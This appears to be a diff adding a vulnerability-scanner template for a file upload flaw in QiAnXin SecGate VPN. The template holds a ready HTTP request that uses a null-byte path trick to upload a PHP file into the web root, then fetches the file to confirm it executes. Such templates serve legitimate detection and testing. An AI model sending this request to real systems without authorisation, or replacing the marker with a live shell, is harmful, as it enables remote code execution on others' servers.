@@ -1,0 +1,61 @@
+id: qianxin-secgateway-file-upload
+
+info:
+  name: QiAnXin SecGate VPN File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    A file upload vulnerability exists in QiAnXin SecGate VPN backup_action.php, allowing attackers to upload malicious files and potentially execute arbitrary code on the server.
+  reference:
+    - https://www.legendsec.com/
+  classification:
+    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 8.5
+  tags: fileupload, rce
+
+variables:
+  filename: "{{rand_base(8)}}.php"
+  content: "<?php echo 'vulnerable'; ?>"
+
+http:
+  - raw:
+      - |
+        POST /admin/system/backup_action.php?cmd HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------{{rand_base(32)}}
+
+        -----------------------------{{rand_base(32)}}
+        Content-Disposition: form-data; name="userfile"; filename="{{filename}}"
+        Content-Type: text/plain
+
+        {{content}}
+        -----------------------------{{rand_base(32)}}
+        Content-Disposition: form-data; name="CFG_UPLOAD_PATH"
+
+        /ssl/www/admin/system/{{filename}}\x00
+        -----------------------------{{rand_base(32)}}--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "vulnerable"
+
+  - raw:
+      - |
+        GET /admin/system/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "vulnerable"
